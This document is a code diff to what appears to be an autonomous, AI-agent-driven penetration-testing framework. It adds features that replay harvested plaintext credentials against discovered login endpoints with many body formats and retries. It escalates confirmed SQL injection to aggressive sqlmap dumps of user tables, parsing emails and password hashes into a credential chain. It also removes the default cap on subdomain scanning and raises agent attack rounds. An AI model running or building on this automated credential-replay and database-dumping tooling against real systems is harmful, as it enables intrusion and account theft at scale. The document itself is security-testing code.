-                            continue
-                        if name:
-                            self.persistent_knowledge_store.add_technology(
-                                host_asset_id, name, version,
-                                source="web_fingerprint"
-                            )
-                logger.info(f"  ✓ Persisted technologies for {len(self.ctx.technologies)} hosts")
-            
-            # ── Endpoints ──
-            if hasattr(self.ctx, 'endpoints') and self.ctx.endpoints:
-                for endpoint in self.ctx.endpoints:
-                    if isinstance(endpoint, dict):
-                        path = endpoint.get("url", "")
-                        method = endpoint.get("method", "GET")
-                        status = endpoint.get("status", 0)
-                        params = endpoint.get("params", [])
-                    elif isinstance(endpoint, str):
-                        path = endpoint
-                        method = "GET"
-                        status = 0
-                        params = []
-                    else:
-                        continue
-                    
-                    if path:
-                        self.persistent_knowledge_store.add_endpoint(
-                            target_id=self.target_id,
-                            path=path,
-                            http_method=method,
-                            status_code=status,
-                            metadata=json.dumps({
-                                "params": params,
-                                "discovered_at": datetime.now().isoformat()
-                            })
-                        )
-                logger.info(f"  ✓ Persisted {len(self.ctx.endpoints)} endpoints")
-            
-            # ── Missing Security Headers → Vulnerability Findings ──
-            profile = getattr(self.ctx, 'target_profile', None) or {}
-            if isinstance(profile, dict):
-                sec_headers = profile.get("security_headers", {})
-            else:
-                sec_headers = getattr(profile, 'security_headers', {}) or {}
-            important_headers = {
-                "X-Frame-Options": ("Missing X-Frame-Options header", "Clickjacking protection not enabled — site can be framed by malicious pages"),
-                "Content-Security-Policy": ("Missing Content-Security-Policy header", "No CSP policy — increased XSS risk"),
-                "Strict-Transport-Security": ("Missing HSTS header", "HSTS not enforced — vulnerable to SSL stripping"),
-                "X-Content-Type-Options": ("Missing X-Content-Type-Options header", "MIME sniffing protection not enabled"),
-            }
-            present_lower = {k.lower() for k in (sec_headers or {})}
-            header_findings = 0
-            for hdr, (title, detail) in important_headers.items():
-                if hdr.lower() not in present_lower:
-                    vuln = {
-                        "type": "MISSING_HEADER",
-                        "title": title,
-                        "severity": "LOW",
-                        "target": self.ctx.target,
-                        "location": self.ctx.target,
-                        "proof": f"HTTP response missing {hdr} header",
-                        "details": detail,
-                        "tool": "profiler",
-                    }
-                    if hasattr(self.ctx, 'add_vulnerability'):
-                        self.ctx.add_vulnerability(vuln)
-                        header_findings += 1
-            if header_findings:
-                logger.info(f"  ✓ Added {header_findings} missing security header findings")
-
-            # ── Summary ──
-            logger.info(f"Persisted: {len(getattr(self.ctx, 'subdomains', []))} subdomains, "
-                        f"{len(getattr(self.ctx, 'ips', []))} IPs, "
-                        f"{len(getattr(self.ctx, 'ports', {}))} hosts with ports, "
-                        f"{len(getattr(self.ctx, 'endpoints', []))} endpoints")
-
-            # ── V2: Feed recon into canonical AttackSurfaceState ──
-            self._feed_recon_to_attack_surface_state()
-
-        except Exception as e:
-            logger.error(f"Failed to persist recon findings: {e}")
-            import traceback
-            logger.error(traceback.format_exc())
-    
     def _feed_recon_to_attack_surface_state(self):
         """Wire V1 recon discoveries into canonical AttackSurfaceState (V2)."""
         surface = getattr(self.ctx, 'attack_surface', None)
@@ -5311,6 +4440,14 @@ class CentralBrain:
                     auth_required=entry.get("kind") == "sensitive",
                 )
                 self.attack_surface.add_endpoint(ep)
+                # Also register each parameter into the graph's parameter inventory
+                # so the InjectionMatrix / param-fuzz path can actually enumerate
+                # them (without this, parameters=0 despite thousands of endpoints).
+                try:
+                    for _p in params:
+                        self.attack_surface.add_parameter(eid, _p)
+                except Exception:
+                    pass
                 added += 1
             except Exception:
                 continue
@@ -5375,6 +4512,14 @@ class CentralBrain:
                     parameters=params,
                 )
                 self.attack_surface.add_endpoint(ep)
+                # Also register each parameter into the graph's parameter inventory
+                # so the InjectionMatrix / param-fuzz path can actually enumerate
+                # them (without this, parameters=0 despite thousands of endpoints).
+                try:
+                    for _p in params:
+                        self.attack_surface.add_parameter(eid, _p)
+                except Exception:
+                    pass
                 added += 1
             except Exception:
                 continue
@@ -5584,6 +4729,37 @@ class CentralBrain:
         else:
             logger.info("[WebPrivesc] No forced browsing or privilege escalation found")
 
+    async def _reprobe_sleeping_hosts(self, dead_urls: list, attempts: int = 4,
+                                        base_delay: int = 15) -> list:
+        """Expert mode: Heroku free-tier dynos, App Engine, Cloud Run and many
+        SaaS previews sleep on idle and 503 the first request. An expert would
+        re-probe with warm-up delays before writing the host off. Returns any
+        hosts that came back alive."""
+        import httpx as _httpx
+        import asyncio as _aio
+        recovered = []
+        if not dead_urls:
+            return recovered
+        logger.info(f"[Reprobe] Attempting to wake {len(dead_urls)} 503/dead host(s)")
+        for attempt in range(attempts):
+            await _aio.sleep(base_delay * (attempt + 1))  # 15s, 30s, 45s, 60s
+            still_dead = []
+            async with _httpx.AsyncClient(follow_redirects=True, timeout=20, verify=False) as client:
+                for url in dead_urls:
+                    try:
+                        r = await client.get(url)
+                        if r.status_code < 500:
+                            recovered.append({"url": url, "status": r.status_code, "live": True})
+                            logger.info(f"[Reprobe] {url} woke up -> HTTP {r.status_code}")
+                        else:
+                            still_dead.append(url)
+                    except Exception:
+                        still_dead.append(url)
+            if not still_dead:
+                break
+            dead_urls = still_dead
+        return recovered
+
     async def _probe_live_subdomains(self, urls: list) -> list:
         """
         Concurrently probe subdomain URLs and return only the LIVE, in-scope ones,
@@ -5651,16 +4827,32 @@ class CentralBrain:
 
         # Probe liveness and keep only live in-scope instances, best-first.
         live = await self._probe_live_subdomains(candidates)
+        # Expert mode: any host we marked dead is re-probed with warm-up delays.
+        # Heroku / App Engine / Cloud Run dynos routinely sleep and 503 on first
+        # touch — an expert wouldn't skip them without a real check.
+        live_urls = {l["url"] for l in live}
+        dead = [u for u in candidates if u not in live_urls]
+        if dead:
+            recovered = await self._reprobe_sleeping_hosts(dead)
+            for r in recovered:
+                live.append(r)
         if not live:
             logger.info("[SubdomainScan] No live subdomains to test")
             return
 
-        cap = _cfg().get_int("MAX_SUBDOMAIN_SCANS", 8)
+        # Expert mode default: test EVERY live subdomain. Setting MAX_SUBDOMAIN_SCANS=0
+        # (default now) means unlimited; a positive value still caps if the operator
+        # explicitly wants to.
+        cap = _cfg().get_int("MAX_SUBDOMAIN_SCANS", 0)
         deep = _cfg().get_bool("SUBDOMAIN_DEEP_SCAN", True)
-        targets = [l["url"] for l in live[:cap]]
-        if len(live) > cap:
-            logger.info(f"[SubdomainScan] Capping to {cap} of {len(live)} live subdomains "
-                        f"(raise MAX_SUBDOMAIN_SCANS to test more)")
+        if cap > 0:
+            targets = [l["url"] for l in live[:cap]]
+            if len(live) > cap:
+                logger.info(f"[SubdomainScan] Capping to {cap} of {len(live)} live subdomains "
+                            f"(MAX_SUBDOMAIN_SCANS=0 to test all)")
+        else:
+            targets = [l["url"] for l in live]
+            logger.info(f"[SubdomainScan] Expert mode: testing all {len(live)} live subdomains (no cap)")
 
         logger.info(f"\n>>> PHASE 1b: LIVE SUBDOMAIN TESTING ({len(targets)} instances, "
                     f"{'comprehensive' if deep else 'recon-only'})")
@@ -5709,7 +4901,7 @@ class CentralBrain:
                     "5) Attempt to demonstrate and report each real vulnerability with evidence.\n"
                     f"IMPORTANT: Only interact with {sub_url} — stay in scope."
                 )
-                rounds = 18
+                rounds = 40   # expert mode — don't stop mid-attack
             else:
                 objective = (
                     f"Perform endpoint discovery and technology fingerprinting on {sub_url}. "
@@ -5717,7 +4909,7 @@ class CentralBrain:
                     "4) whatweb/httpx fingerprint. 5) Find exposed API/admin/login. "
                     f"IMPORTANT: Only scan {sub_url} — stay in scope."
                 )
-                rounds = 10
+                rounds = 25
 
             try:
                 executor = AgenticExecutor(
@@ -5764,154 +4956,12 @@ class CentralBrain:
         except Exception:
             pass
 
-    async def _persist_captured_requests(self):
-        """Save captured HTTP requests to disk for replay."""
-        try:
-            if not self.ctx.captured_requests:
-                logger.debug("No captured requests to persist")
-                return
-
-            logger.info("Persisting captured HTTP requests...")
-            request_file = self.report_dir / f"captured_requests_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
-            with open(request_file, 'w') as f:
-                json.dump({
-                    "target": self.ctx.target,
-                    "captured_at": datetime.now().isoformat(),
-                    "pages": self.ctx.crawled_pages,
-                    "requests": self.ctx.captured_requests,
-                }, f, indent=2)
-            logger.info(f"Saved {len(self.ctx.captured_requests)} requests to {request_file}")
-        except Exception as e:
-            logger.error(f"Failed to persist captured requests: {e}")
-
-    async def _persist_vulnerabilities(self):
-        """Save vulnerability findings to knowledge store."""
-        try:
-            if not self.ctx.vulnerabilities:
-                logger.debug("No vulnerabilities to persist")
-                return
-            
-            logger.info("Persisting vulnerability findings...")
-            for vuln in self.ctx.vulnerabilities:
-                finding_id = self.persistent_knowledge_store.add_finding(
-                    target_id=self.target_id,
-                    title=vuln.get("title", "Unknown"),
-                    description=vuln.get("details", ""),
-                    severity=vuln.get("severity", "MEDIUM"),
-                    category=vuln.get("type", ""),
-                    cwe=vuln.get("cwe", ""),
-                    cve=vuln.get("cve", ""),
-                    affected_asset=vuln.get("location", ""),
-                    evidence=json.dumps(vuln.get("proof", {})),
-                    source_agent_id=vuln.get("source_agent", ""),
-                )
-                # Add evidence
-                for evidence_item in vuln.get("evidence", []):
-                    if isinstance(evidence_item, dict):
-                        self.persistent_knowledge_store.add_evidence(
-                            finding_id,
-                            evidence_type=evidence_item.get("type", "screenshot"),
-                            content=evidence_item.get("content", ""),
-                            tool_name=evidence_item.get("tool", "")
-                        )
-            
-            logger.info(f"Persisted {len(self.ctx.vulnerabilities)} vulnerabilities")
-        except Exception as e:
-            logger.error(f"Failed to persist vulnerabilities: {e}")
-
-    async def _persist_exploit_results(self):
-        """Save exploitation results to knowledge store."""
-        try:
-            if not self.ctx.exploit_results:
-                logger.debug("No exploit results to persist")
-                return
-            
-            logger.info("Persisting exploit results...")
-            for result in self.ctx.exploit_results:
-                self.persistent_knowledge_store.add_exploit_result(
-                    target_id=self.target_id,
-                    vuln_id=result.get("vuln_id", ""),
-                    exploit_id=result.get("exploit_id", ""),
-                    payload=result.get("payload", ""),
-                    success=result.get("success", False),
-                    proof=result.get("proof", ""),
-                    severity=result.get("severity", "MEDIUM"),
-                    executed_at=result.get("timestamp", datetime.now().isoformat()),
-                )
-            
-            logger.info(f"Persisted {len(self.ctx.exploit_results)} exploitation results")
-
-            # Record experience for learning
-            for result in self.ctx.exploit_results:
-                strategy = result.get("strategy", result.get("vuln_type", "unknown"))
-                test_type = result.get("test_type", result.get("capability", "unknown"))
-                if result.get("success"):
-                    self.experience_learner.record_success(strategy, test_type, result)
-                else:
-                    self.experience_learner.record_failure(
-                        strategy, test_type, result.get("error", "exploit_failed"))
-            patterns = self.experience_learner.detect_patterns()
-            if patterns:
-                logger.info(f"[ExperienceLearner] Detected {len(patterns)} failure patterns")
-                for p in patterns:
-                    logger.info(f"  Pattern: {p}")
-
-        except Exception as e:
-            logger.error(f"Failed to persist exploit results: {e}")
-
-    async def _persist_post_exploit_findings(self):
-        """Save post-exploitation findings (privesc, lateral, persistence, MITRE)."""
-        try:
-            findings = []
-            
-            # Privesc findings
-            for priv in self.ctx.privesc_findings:
-                self.persistent_knowledge_store.add_post_exploit_finding(
-                    target_id=self.target_id,
-                    type="privesc",
-                    host=priv.get("host", ""),
-                    technique=priv.get("technique", ""),
-                    detail=priv.get("detail", ""),
-                    severity=priv.get("severity", "MEDIUM"),
-                    metadata=json.dumps(priv)
-                )
-                findings.append(priv)
-            
-            # Lateral movement
-            if self.ctx.lateral_plan:
-                for pivot in self.ctx.lateral_plan.get("pivots", []):
-                    self.persistent_knowledge_store.add_post_exploit_finding(
-                        target_id=self.target_id,
-                        type="lateral_movement",
-                        host=pivot.get("source_host", ""),
-                        technique=pivot.get("technique", ""),
-                        detail=f"Move to {pivot.get('target_host', '')}",
-                        metadata=json.dumps(pivot)
-                    )
-                    findings.append(pivot)
-            
-            # Persistence mechanisms
-            for persist in self.ctx.persistence_plan:
-                self.persistent_knowledge_store.add_post_exploit_finding(
-                    target_id=self.target_id,
-                    type="persistence",
-                    technique=persist.get("mechanism", ""),
-                    detail=persist.get("artifact", ""),
-                    metadata=json.dumps(persist)
-                )
-                findings.append(persist)
-            
-            logger.info(f"Persisted {len(findings)} post-exploitation findings")
-        except Exception as e:
-            logger.error(f"Failed to persist post-exploit findings: {e}")
-
-
     def _load_phase_prompt(self, phase: str) -> Optional[str]:
         """Load phase-specific prompt from file if available"""
         prompt_map = {
-            "recon": "prompts/brain_recon.txt",
-            "analyze": "prompts/brain_analyze.txt",
-            "exploit": "prompts/brain_exploit.txt",
+            "recon": "core/prompts/brain/brain_recon.txt",
+            "analyze": "core/prompts/brain/brain_analyze.txt",
+            "exploit": "core/prompts/brain/brain_exploit.txt",
         }
         path = prompt_map.get(phase)
         if path and Path(path).exists():
@@ -6292,6 +5342,293 @@ class CentralBrain:
                 self.ctx.log_brain("Authenticated session established", "auth")
         except Exception as e:
             logger.warning(f"[Auth] session setup failed (non-fatal): {e}")
+        # Publish the active auth into the process-wide registry so V2 executors
+        # that don't hold a reference to shared_context (see
+        # core/execution/executors/generic.py::_auth_headers) can pick it up.
+        try:
+            from core.execution.executors.auth_registry import set_active_auth
+            set_active_auth(
+                headers=getattr(self.ctx, "auth_headers", {}) or {},
+                cookies=getattr(self.ctx, "auth_cookies", {}) or {},
+                sessions=getattr(self.ctx, "auth_sessions", {}) or {},
+            )
+        except Exception as _e:
+            logger.debug(f"[Auth] registry publish failed: {_e}")
+        # If we obtained a real live session (from UI creds or .env auth), also
+        # persist a proof-of-entry so the UI 'Access Gained' panel shows it.
+        try:
+            hdrs = getattr(self.ctx, "auth_headers", {}) or {}
+            authz = hdrs.get("Authorization", "")
+            if authz.startswith("Bearer "):
+                from core.database.pg_store import AuthBypassRepo
+                from urllib.parse import urlparse as _up
+                _base = self.ctx.target
+                _host = _up(_base if "://" in _base else f"https://{_base}").netloc
+                for cred in (getattr(self.ctx, "auth_credentials", None) or [{}])[:1]:
+                    AuthBypassRepo.insert(
+                        self._scan_id, _host, "credential_replay",
+                        cred.get("login_url", "") or _base,
+                        method="POST",
+                        username=cred.get("username") or cred.get("email") or "",
+                        password=cred.get("password") or "",
+                        payload="(operator-supplied credentials)",
+                        token=authz[len("Bearer "):],
+                        response_status=200,
+                        response_snippet="Session established via _setup_auth_session",
+                        role=cred.get("role") or "", severity="info",
+                    )
+        except Exception:
+            pass
+
+    async def _auto_login_with_harvested_creds(self) -> None:
+        """Take every plaintext credential we harvested (from OSINT leaks, sqlmap
+        dumps, cracked hashes, mass-assign register) and actually LOG IN with it.
+
+        Each successful login yields a fresh JWT which we:
+          1. Attach to the credential entry so CredChain's `cred['token']` lookup works
+          2. Publish to the executor auth registry so all downstream V2 executors
+             can run authenticated
+          3. Persist as an 'Access Gained' row so operators see the proof-of-entry
+
+        Login endpoints are auto-discovered from `captured_requests` +
+        `endpoint_catalog` — any path matching /login /signin /session /token /auth.
+        """
+        creds = getattr(self.ctx, "harvested_creds", []) or []
+        candidates = []
+        seen = set()
+        for c in creds:
+            if not isinstance(c, dict):
+                continue
+            if c.get("token"):
+                continue  # already have a session
+            user = c.get("username") or c.get("email")
+            pw = c.get("password")
+            if not (user and pw):
+                continue
+            key = f"{user}|{pw}"
+            if key in seen:
+                continue
+            seen.add(key)
+            candidates.append(c)
+        if not candidates:
+            return
+
+        # Discover login endpoints from what we've already seen the app expose.
+        base = self.ctx.target
+        if not base.startswith(("http://", "https://")):
+            base = f"https://{base}"
+        from urllib.parse import urlparse as _up
+        base_host = _up(base).netloc
+        login_urls = set()
+        LOGIN_HINTS = ("/rest/user/login", "/api/login", "/login", "/signin",
+                       "/session", "/auth/login", "/oauth/token", "/api/v1/login")
+        for r in (getattr(self.ctx, "captured_requests", []) or []):
+            u = r.get("url") if isinstance(r, dict) else getattr(r, "url", "")
+            if u and any(h in u.lower() for h in LOGIN_HINTS):
+                login_urls.add(u.split("?")[0])
+        for ep in (getattr(self.ctx, "endpoint_catalog", []) or []):
+            u = ep.get("url") if isinstance(ep, dict) else ""
+            if u and any(h in u.lower() for h in LOGIN_HINTS):
+                login_urls.add(u.split("?")[0])
+        # Fall back to the Juice-Shop / common default on the base host
+        if not login_urls:
+            login_urls.add(f"{base.rstrip('/')}/rest/user/login")
+            login_urls.add(f"{base.rstrip('/')}/api/login")
+
+        logger.info(f"[AutoLogin] Trying {len(candidates)} plaintext cred(s) against {len(login_urls)} login endpoint(s)")
+        import httpx as _httpx, json as _json, base64 as _b64
+        from core.database.pg_store import AuthBypassRepo
+        from core.execution.executors.auth_registry import set_active_auth
+
+        # Expert mode: long-backoff retry so a transient 503/timeout doesn't
+        # declare valid creds dead. Retries spread over ~4 minutes total.
+        RETRY_DELAYS = [0, 2, 5, 15, 45, 120]  # seconds
+        BODY_SHAPES = [
+            ("json", {"email": "{U}", "password": "{P}"}),
+            ("json", {"username": "{U}", "password": "{P}"}),
+            ("json", {"login": "{U}", "password": "{P}"}),
+            ("json", {"user": "{U}", "pass": "{P}"}),
+            ("json", {"identifier": "{U}", "password": "{P}"}),
+            ("json", {"id": "{U}", "pwd": "{P}"}),
+            ("form", "email={U}&password={P}"),
+            ("form", "username={U}&password={P}"),
+            ("form", "j_username={U}&j_password={P}"),  # Spring/JEE
+        ]
+        import asyncio as _asyncio
+        async with _httpx.AsyncClient(follow_redirects=True, timeout=30, verify=False) as client:
+            for cred in candidates:
+                user = cred.get("username") or cred.get("email")
+                pw = cred.get("password")
+                logged_in = False
+                for lurl in login_urls:
+                    if logged_in:
+                        break
+                    for shape, tmpl in BODY_SHAPES:
+                        if logged_in:
+                            break
+                        for delay in RETRY_DELAYS:
+                            if delay:
+                                await _asyncio.sleep(delay)
+                            try:
+                                if shape == "json":
+                                    body = {k: (v.replace("{U}", str(user)).replace("{P}", str(pw))
+                                                if isinstance(v, str) else v)
+                                            for k, v in tmpl.items()}
+                                    resp = await client.post(lurl, json=body)
+                                else:
+                                    from urllib.parse import quote as _q
+                                    body_s = tmpl.replace("{U}", _q(str(user))).replace("{P}", _q(str(pw)))
+                                    resp = await client.post(
+                                        lurl, content=body_s,
+                                        headers={"Content-Type": "application/x-www-form-urlencoded"})
+                                    body = body_s
+                            except Exception:
+                                continue
+                            # Treat transient errors as retryable
+                            if resp.status_code in (429, 500, 502, 503, 504):
+                                logger.debug(f"[AutoLogin] {user}@{lurl} shape={shape} -> {resp.status_code}, retrying")
+                                continue
+                            if resp.status_code not in (200, 201):
+                                break  # non-transient failure — try next body shape
+                        # Extract token
+                        token = None
+                        try:
+                            j = resp.json()
+                            if isinstance(j, dict):
+                                auth = j.get("authentication") or {}
+                                token = (auth.get("token") if isinstance(auth, dict) else None) \
+                                    or j.get("access_token") or j.get("token") or j.get("id_token")
+                        except Exception:
+                            pass
+                        if not token or not isinstance(token, str) or not token.startswith("eyJ"):
+                            continue
+                        # Decode JWT for role
+                        role = ""
+                        try:
+                            p = token.split(".")[1]
+                            p += "=" * (-len(p) % 4)
+                            payload = _json.loads(_b64.urlsafe_b64decode(p).decode("utf-8", "ignore"))
+                            data = payload.get("data") or payload
+                            if isinstance(data, dict):
+                                role = data.get("role", "")
+                        except Exception:
+                            pass
+                        # Attach token, publish, persist
+                        cred["token"] = token
+                        cred["role"] = role
+                        cred["login_url"] = lurl
+                        hdrs = dict(getattr(self.ctx, "auth_headers", {}) or {})
+                        hdrs["Authorization"] = f"Bearer {token}"
+                        self.ctx.auth_headers = hdrs
+                        try:
+                            set_active_auth(
+                                headers=hdrs,
+                                cookies=getattr(self.ctx, "auth_cookies", {}) or {},
+                                sessions=getattr(self.ctx, "auth_sessions", {}) or {},
+                            )
+                        except Exception:
+                            pass
+                        try:
+                            payload_str = _json.dumps(body) if isinstance(body, dict) else str(body)
+                            AuthBypassRepo.insert(
+                                self._scan_id, _up(lurl).netloc or base_host,
+                                "credential_replay", lurl,
+                                method="POST", username=user, password=pw,
+                                payload=payload_str,
+                                token=token, response_status=resp.status_code,
+                                response_snippet=(resp.text or "")[:600],
+                                role=role,
+                                severity=("critical" if "admin" in role.lower() else "high"),
+                            )
+                        except Exception:
+                            pass
+                        logger.info(f"[AutoLogin] {user} -> {lurl} (shape={shape}) = 200 (role={role or '?'}) — token attached")
+                        logged_in = True
+                        break  # break retry loop
+
+    async def _escalate_sqli_to_dump(self) -> None:
+        """For each confirmed SQL-injection vuln, run sqlmap --batch --dump on
+        the users table so admin rows (email + password hash) land in
+        harvested_creds/leaked_credentials — feeding the credential chain."""
+        vulns = getattr(self.ctx, "vulnerabilities", []) or []
+        sqli_targets = []
+        seen = set()
+        for v in vulns:
+            vd = v if isinstance(v, dict) else getattr(v, "__dict__", {})
+            vtype = str(vd.get("type", "")).lower()
+            title = str(vd.get("title", "")).lower()
+            if "sql" not in vtype and "sql injection" not in title:
+                continue
+            url = vd.get("location") or vd.get("target") or vd.get("url", "")
+            if not url or not url.startswith(("http://", "https://")):
+                continue
+            key = url.split("?")[0]
+            if key in seen:
+                continue
+            seen.add(key)
+            sqli_targets.append(url)
+        if not sqli_targets:
+            return
+        logger.info(f"[SQLiDump] Escalating {len(sqli_targets)} confirmed SQLi endpoint(s) to sqlmap --dump")
+        try:
+            from core.tools.kali_executor import KaliExecutor
+            executor = KaliExecutor()
+        except Exception:
+            return
+        added_creds = 0
+        # Expert mode: dump every confirmed SQLi endpoint, all known-user tables +
+        # --dump-all schema enumeration. Level 5/risk 3, every technique.
+        for url in sqli_targets:
+            try:
+                # First: enumerate schema so we don't guess table names
+                enum_cmd = (f"sqlmap -u {url!r} --batch --level=5 --risk=3 "
+                            f"--random-agent --timeout=30 --retries=2 --technique=BEUSTQ "
+                            f"--dbs --tables --threads=4")
+                await executor.execute(enum_cmd, timeout=300)
+                for table in ("users", "Users", "user", "User", "accounts", "Account",
+                              "customers", "members", "admins"):
+                    cmd = (f"sqlmap -u {url!r} --batch --level=5 --risk=3 "
+                           f"--random-agent --timeout=30 --retries=2 --technique=BEUSTQ "
+                           f"-T {table} --dump --threads=4")
+                    res = await executor.execute(cmd, timeout=420)
+                    out = str(res.get("stdout") or "") if isinstance(res, dict) else str(res)
+                    if not out or "no columns" in out.lower():
+                        continue
+                    # Parse table rows: sqlmap dumps look like `| email | password |`
+                    import re as _re
+                    row_re = _re.compile(r'\|\s*([^|]*@[^|]*)\s*\|\s*([a-f0-9]{32,128}|\$2[aby]\$[^|\s]+)\s*\|')
+                    for m in row_re.finditer(out):
+                        email, pw = m.group(1).strip().lower(), m.group(2).strip()
+                        hc = list(getattr(self.ctx, "harvested_creds", []) or [])
+                        hc.append({
+                            "username": email, "email": email, "password": pw,
+                            "source": "sqlmap_dump", "table": table, "sqli_url": url,
+                        })
+                        self.ctx.harvested_creds = hc
+                        added_creds += 1
+                        # Persist proof-of-entry row so the UI's "Access Gained"
+                        # panel shows sqlmap-dumped creds as a bypass event.
+                        try:
+                            from core.database.pg_store import AuthBypassRepo
+                            from urllib.parse import urlparse as _up
+                            _host = _up(url).netloc
+                            AuthBypassRepo.insert(
+                                self._scan_id, _host, "sqlmap_dump", url,
+                                method="EXFIL", username=email, password="",
+                                payload=f"sqlmap -u {url} -T {table} --dump",
+                                token="", response_status=200,
+                                response_snippet=f"Row from {table}: email={email}, hash={pw[:60]}",
+                                role="", severity="critical",
+                            )
+                        except Exception:
+                            pass
+                    if added_creds:
+                        break
+            except Exception as e:
+                logger.debug(f"[SQLiDump] {url} failed: {e}")
+                continue
+        if added_creds:
+            logger.info(f"[SQLiDump] Extracted {added_creds} credentials — feeding auth chain")
 
     def _record_critic_outcomes(self, findings: list) -> None:
         """Feed critic-annotated findings into the reward policy for self-improvement."""
@@ -6677,9 +6014,18 @@ CRITICAL RULES:
             "agents": self.ctx.agents_spawned,
         }
 
-        # Generate automated exploit POC reproduction scripts (Python, cURL, Markdown)
+        # Generate automated exploit POC reproduction scripts (Python, cURL, Markdown).
+        # PoCs persist to Postgres (scan_artifacts) so the UI can render them; disk
+        # writes only happen when REPORTS_ENABLED=1.
         try:
-            poc_files = POCGenerator.generate(self.ctx, output_dir=str(self.report_dir))
+            # Ensure the shared_context knows its scan_id so POCGenerator can persist to DB
+            try:
+                setattr(self.ctx, "scan_id", getattr(self, "_scan_id", None) or getattr(self.ctx, "scan_id", None))
+            except Exception:
+                pass
+            from core.common.reports_config import reports_enabled as _re
+            poc_files = POCGenerator.generate(self.ctx,
+                                              output_dir=str(self.report_dir) if _re() else None)
             if poc_files:
                 report["poc_artifacts"] = poc_files
                 logger.info(f"POC reproduction scripts generated: {poc_files}")
@@ -7116,7 +6462,18 @@ CRITICAL RULES:
             
             logger.info(">>> OSINT Reconnaissance Complete")
             logger.info("=" * 60)
-            
+
+            # Persist OSINT into live_results + recon_data so the UI sees it
+            # immediately without waiting for the next phase's heartbeat.
+            try:
+                self._write_live_results()
+            except Exception as _e:
+                logger.warning(f"[OSINT] live-results flush failed (non-fatal): {_e}")
+            try:
+                self._persist_recon_data()
+            except Exception as _e:
+                logger.warning(f"[OSINT] recon_data persist failed (non-fatal): {_e}")
+
         except Exception as e:
             logger.error(f"OSINT Reconnaissance failed: {e}")
             self.ctx.update('osint_failed', True)
@@ -7153,35 +6510,6 @@ CRITICAL RULES:
         # Include in next phase planning log
         logger.info(f"OSINT context generated for DEEP_RECONNAISSANCE: {osint_context.strip()}")
 
-    async def _capture_requests(self):
-        """Phase 1b: Intercept HTTP traffic across target via RequestCapturer."""
-        try:
-            from core.exploitation.request_capture import RequestCapturer
-            capturer = RequestCapturer(max_pages=12, max_depth=2)
-            capture_res = await asyncio.to_thread(capturer.capture, self.target)
-            if capture_res and capture_res.requests:
-                capturer.store(capture_res, self.ctx)
-                logger.info(f"[capture] Intercepted {len(capture_res.requests)} live HTTP requests across {len(capture_res.pages)} pages")
-            else:
-                err_msg = capture_res.error if capture_res else "no requests captured"
-                logger.warning(f"[capture] {err_msg}")
-        except Exception as e:
-            logger.warning(f"[capture] Failed to capture requests: {e}")
-
-    async def _persist_captured_requests(self):
-        """Persist intercepted requests into findings database / knowledge store."""
-        captured = getattr(self.ctx, "captured_requests", [])
-        if captured and hasattr(self, "store") and self.store:
-            try:
-                for req in captured:
-                    self.store.add_asset(
-                        asset_type="captured_request",
-                        value=getattr(req, "url", ""),
-                        metadata={"method": getattr(req, "method", "GET"), "status": getattr(req, "status", 0)}
-                    )
-                logger.info(f"[capture] Persisted {len(captured)} captured requests to KnowledgeStore")
-            except Exception as e:
-                logger.warning(f"Failed to persist captured requests: {e}")
 
     async def _analyze_client_scripts(self):
         """Phase 1c: Reconstruct API routes, parameters, and credentials from client JS bundles."""
